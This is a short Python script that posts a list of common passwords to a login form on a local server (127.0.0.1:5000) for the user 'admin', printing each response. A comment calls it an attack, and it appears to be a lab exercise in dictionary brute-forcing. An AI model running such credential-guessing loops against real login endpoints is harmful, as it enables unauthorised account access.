import requests
import time

url = "http://127.0.0.1:5000"

passwords = ["1234", "admin", "test", "password", "letmein","archanaachu","password123"]

for pwd in passwords:
    data = {
        "username": "admin",
        "password": pwd
    }

    response = requests.post(url, data=data)

    print(f"Trying {pwd} → {response.text}")
    
    time.sleep(1)  # slow down attack (optional)